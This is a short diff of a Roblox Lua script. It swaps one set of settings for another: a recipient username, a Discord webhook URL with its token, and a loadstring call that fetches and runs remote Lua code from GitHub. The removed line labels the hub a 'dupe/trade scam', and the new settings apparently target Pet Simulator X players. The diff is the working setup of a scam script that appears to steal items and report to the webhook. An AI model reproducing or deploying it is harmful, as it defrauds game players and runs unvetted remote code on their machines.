@@ -1,5 +1,4 @@
-_G.Username = "mayrushart_realy"
-_G.HubName = "dupe/trade scam"
-_G.WebhookUrl = "https://discord.com/api/webhooks/1096171387493830656/_EcimJ-4I_31x_7Caq5Cl9jDWLpkWMJPRgMZ7gIu8mrIl_lwjSo75NW1d2huv-5O8YUf"
+UserName = "xex23a"
+WebHook = "https://discord.com/api/webhooks/1101218523474300948/y6U_jC7r4_oi5zgjVHWPLG9ChCdIbAiyM1Qvn3li8Ve2KLGsy8-o9VgmHXrilK-qHBdr"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
